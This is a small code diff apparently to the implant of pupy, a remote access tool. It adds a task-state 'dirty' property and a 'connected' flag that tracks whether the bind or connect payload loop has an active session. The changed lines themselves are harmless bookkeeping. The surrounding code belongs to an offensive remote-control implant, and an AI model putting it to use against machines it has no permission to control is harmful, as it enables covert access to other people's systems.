@@ -345,6 +345,10 @@ class Manager(object):
             return False
 
     @property
+    def dirty(self):
+        return any(x.dirty for x in self.tasks.itervalues())
+
+    @property
     def status(self):
         return {
             name:{
@@ -371,6 +375,7 @@ class Manager(object):
 
 setattr(pupy, 'manager', Manager(PStore()))
 setattr(pupy, 'Task', Task)
+setattr(pupy, 'connected', False)
 
 def safe_obtain(proxy):
     """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
@@ -685,6 +690,7 @@ def rpyc_loop(launcher):
     stream=None
     for ret in launcher.iterate():
         try:
+            pupy.connected = False
             if isinstance(ret, tuple):  # bind payload
                 server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
                 s = server_class(
@@ -698,6 +704,7 @@ def rpyc_loop(launcher):
                     pupy_srv=None,
                 )
                 s.start()
+                pupy.connected = True
 
             else:  # connect payload
                 stream = ret
@@ -732,6 +739,7 @@ def rpyc_loop(launcher):
                 lastping = None
 
                 with lock:
+                    pupy.connected = True
                     while not conn.closed:
                         conn.serve()
 
